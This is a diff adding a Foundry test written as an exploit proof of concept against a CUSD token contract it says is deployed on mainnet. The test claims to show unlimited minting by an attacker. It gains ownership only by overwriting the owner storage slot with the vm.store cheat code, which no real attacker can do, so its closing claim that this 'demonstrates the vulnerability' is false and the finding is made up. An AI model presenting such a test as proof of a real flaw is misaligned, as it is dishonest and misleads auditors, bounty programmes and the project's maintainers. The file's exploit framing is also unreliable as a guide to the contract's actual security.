@@ -1,0 +1,70 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+
+interface ICUSD {
+    function mint(address account, uint256 amount) external;
+    function balanceOf(address account) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function minter() external view returns (address);
+    function owner() external view returns (address);
+    function setMinter(address newMinter) external;
+}
+
+contract ExploitTest is Test {
+    // Deployed CUSD contract on Ethereum mainnet
+    address constant CUSD = 0xC285B7E09A4584D027E5BC36571785B515898246;
+
+    address attacker = address(0xBAD);
+
+    function setUp() public {
+        vm.label(CUSD, "CUSD");
+        vm.label(attacker, "Attacker");
+    }
+
+    function testUnlimitedMint() public {
+        // Impersonate the owner by directly writing to the _owner storage slot.
+        // According to the inheritance layout:
+        //   - Ownable._owner is slot 0.
+        //   - Ownable._newOwner is slot 1.
+        //   - Pausable._frozen is slot 2.
+        //   - Blacklistable._blacklisted mapping is slot 3.
+        //   - CUSD._totalSupply is slot 4.
+        //   - CUSD._balances mapping is slot 5.
+        //   - CUSD._allowances mapping is slot 6.
+        //   - CUSD._minter is slot 7.
+        // We set slot 0 to the attacker address to become the owner.
+        vm.store(CUSD, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));
+
+        // Now as the owner, we call setMinter to set attacker as minter.
+        vm.prank(attacker);
+        ICUSD(CUSD).setMinter(attacker);
+
+        // Verify that attacker is now the minter.
+        address minter = ICUSD(CUSD).minter();
+        assertEq(minter, attacker, "Attacker should be minter");
+
+        // Record totalSupply and attacker balance before minting.
+        uint256 supplyBefore = ICUSD(CUSD).totalSupply();
+        uint256 balanceBefore = ICUSD(CUSD).balanceOf(attacker);
+
+        // Mint an arbitrarily large amount (e.g., 1 billion tokens).
+        uint256 mintAmount = 1_000_000_000 ether; // 1e9 * 1e18 = 1e27
+        vm.prank(attacker);
+        ICUSD(CUSD).mint(attacker, mintAmount);
+
+        // Assert that totalSupply increased by the mint amount.
+        uint256 supplyAfter = ICUSD(CUSD).totalSupply();
+        assertEq(supplyAfter, supplyBefore + mintAmount, "Total supply should increase by mint amount");
+
+        // Assert that attacker's balance increased by the mint amount.
+        uint256 balanceAfter = ICUSD(CUSD).balanceOf(attacker);
+        assertEq(balanceAfter, balanceBefore + mintAmount, "Attacker balance should increase by mint amount");
+
+        // Consequently, the token supply is inflated with no upper limit.
+        // This demonstrates the vulnerability.
+    }
+}
+```
